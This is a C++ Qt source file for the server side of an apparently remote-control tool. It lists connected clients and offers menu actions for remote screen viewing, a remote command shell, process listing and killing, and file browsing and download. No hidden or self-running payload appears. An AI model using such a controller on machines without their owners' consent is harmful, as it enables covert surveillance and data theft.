#include "iocpsever.h"
#include <qDebug>

CRITICAL_SECTION CriticalSection;

IOCPSever::IOCPSever(QWidget *parent)
    : QMainWindow(parent)
{
    ui.setupUi(this);
    InitializeCriticalSection(&CriticalSection);
    InitUI();
    InitSocket();
   
}



void ThreadHeart(MySocket* pScoket)
{
 while(1)
 {
     Sleep(30000);
     pScoket->Heartbeat();
 }
        
}

void IOCPSever::InitSocket()
{
    m_pSocket = new MySocket;
    m_pSocket->Start();
    m_pSocket->BindAndListen();
    m_pSocket->ModleIocp();

   
    QObject::connect(m_pSocket, SIGNAL(sig_sendsession(Session*)),this,SLOT(slots_HandleSession(Session*)));
    QObject::connect(m_pSocket, SIGNAL(sig_sendUpate(Session*)), this, SLOT(slots_UpDateTime(Session*)));

    std::thread t(ThreadHeart, m_pSocket);
    t.detach();
}

void IOCPSever::InitUI()
{
    QStringList list;
    list << "ip" << "port" << "time";
    ui.tableWidget->setColumnWidth(0, 200);
    ui.tableWidget->setColumnWidth(1, 150);
    ui.tableWidget->setHorizontalHeaderLabels(list);
    //设置不能修改内容
    ui.tableWidget->setEditTriggers(QAbstractItemView::NoEditTriggers);
    //设置整行选择
    ui.tableWidget->setSelectionBehavior(QAbstractItemView::SelectRows);

    //添加右键菜单的子项
    m_PMenu = new QMenu;
    QAction* pScreen = new QAction(QStringLiteral("屏幕"));
    QAction* pCmd = new QAction(QStringLiteral("cmd"));
    QAction* pProcess = new QAction(QStringLiteral("Process"));
    QAction* pFile = new QAction(QStringLiteral("File"));
    m_PMenu->addAction(pScreen);
    m_PMenu->addAction(pCmd);
    m_PMenu->addAction(pProcess);
    m_PMenu->addAction(pFile);

    //菜单项关联槽
    QObject::connect(pScreen, SIGNAL(triggered(bool)), this, SLOT(slots_ShowScreen(bool)));
    QObject::connect(pCmd, SIGNAL(triggered(bool)), this, SLOT(slots_ShowCmd(bool)));
    QObject::connect(pProcess, SIGNAL(triggered(bool)), this, SLOT(slots_ShowProcess(bool)));
    QObject::connect(pFile, SIGNAL(triggered(bool)), this, SLOT(slots_ShowFile(bool)));
    //显示菜单槽
    QObject::connect(ui.tableWidget, SIGNAL(customContextMenuRequested(const QPoint)), this, SLOT(slots_ShowMenu(const QPoint)));

   
}

void IOCPSever::slots_HandleSession(Session* ps)
{
   
   
    std::stringstream ss;
    std::string str;
    ss << ntohs(ps->m_addr.sin_port);
    ss >> str;
    int nRow = ui.tableWidget->rowCount();
    ui.tableWidget->insertRow(nRow);

    QTableWidgetItem*  pNewItem = new QTableWidgetItem(inet_ntoa(ps->m_addr.sin_addr));
    //把socket设置到Item里面
    pNewItem->setData(Qt::UserRole, ps->m_sock);
    //设置ip
    ui.tableWidget->setItem(nRow, 0, pNewItem);
    //设置端口     
    ui.tableWidget->setItem(nRow, 1, new QTableWidgetItem(str.c_str()));


    //设置时间
    ss.clear();
    str.clear();
    ss << ps->m_hour << ":" << ps->m_minute << ":" << ps->m_second;
    ss >> str;
    ui.tableWidget->setItem(nRow, 2, new QTableWidgetItem(str.c_str()));

   
}

void IOCPSever::slots_UpDateTime(Session* ps)
{

    std::stringstream ss;
    ss << ntohs(ps->m_addr.sin_port);
    QString stext = ss.str().c_str();
    QList<QTableWidgetItem *> pList=ui.tableWidget->findItems(stext, Qt::MatchExactly);

    for(auto &i: pList)
    {
        //设置时间
        std::stringstream ss1;
        std::string str;
        ss1 << ps->m_hour << ":" << ps->m_minute << ":" << ps->m_second;
        ss1 >> str;

        int nRow=i->row();
        QTableWidgetItem *pItem = ui.tableWidget->item(nRow, 2);
        pItem->setText(str.c_str());
    }


}
void IOCPSever::slots_ShowMenu(const QPoint & pos)
{
    m_PMenu->exec(QCursor::pos());
}

//显示屏幕
void IOCPSever::slots_ShowScreen(bool ch)
{

    Session* ps = GetQtbaleSocket();

    if (ps->pScreen == NULL)
    {
        ps->pScreen = new ScreenDialog;
        QObject::connect(m_pSocket, SIGNAL(sig_sendWindows(QByteArray)), ps->pScreen, SLOT(Handledata(QByteArray)));
        
    }

    ps->pScreen->show();
  
    SendData(ps->m_sock, CUT_WINDOWS, NULL, 0);
}

//获取session
Session* IOCPSever::GetQtbaleSocket()
{
    int nIndex = ui.tableWidget->currentRow();
    QTableWidgetItem * pItem = ui.tableWidget->item(nIndex, 0);

    SOCKET sClient = pItem->data(Qt::UserRole).toInt();
    return   m_pSocket->GetSession(sClient);
}
//显示cmd的槽函数
void IOCPSever::slots_ShowCmd(bool ch)
{
    Session* ps = GetQtbaleSocket();

    if (ps->pCmd== NULL)
    {
        ps->pCmd = new CmdDialog(ps->m_sock);
        QObject::connect(m_pSocket, SIGNAL(sig_sendCmd(QByteArray)), ps->pCmd, SLOT(handleResults(QByteArray)));
        SendData(ps->m_sock, CUT_CMD, NULL, 0);
    }

    ps->pCmd->show();
}
//显示Process的槽函数
void IOCPSever::slots_ShowProcess(bool ch)
{
    Session* ps = GetQtbaleSocket();

    if (ps->pProcess == NULL)
    {
        ps->pProcess = new ProcessDialog(ps->m_sock);
        QObject::connect(m_pSocket, SIGNAL(sig_sendProcess(QByteArray)), ps->pProcess, SLOT(handleResults(QByteArray)));
        QObject::connect(m_pSocket, SIGNAL(sig_deleteProcess(QByteArray)), ps->pProcess, SLOT(slots_deleteProcess(QByteArray)));
 
        SendData(ps->m_sock, CUT_PROCESS, NULL, 0);
    }

    ps->pProcess->show();
}
//显示文件的槽函数
void  IOCPSever::slots_ShowFile(bool ch)
{
    Session* ps = GetQtbaleSocket();

    if (ps->pFile == NULL)
    {
        ps->pFile = new FileDialog(ps->m_sock);
        QObject::connect(m_pSocket, SIGNAL(sig_sendFile(QByteArray)), ps->pFile, SLOT(handleResults(QByteArray)));
        QObject::connect(m_pSocket, SIGNAL(sig_sendDownload(QByteArray)), ps->pFile, SLOT(slots_HandleCopyFile(QByteArray)));
        SendData(ps->m_sock, CUT_FILE, NULL, 0);
    }

    ps->pFile->show();
}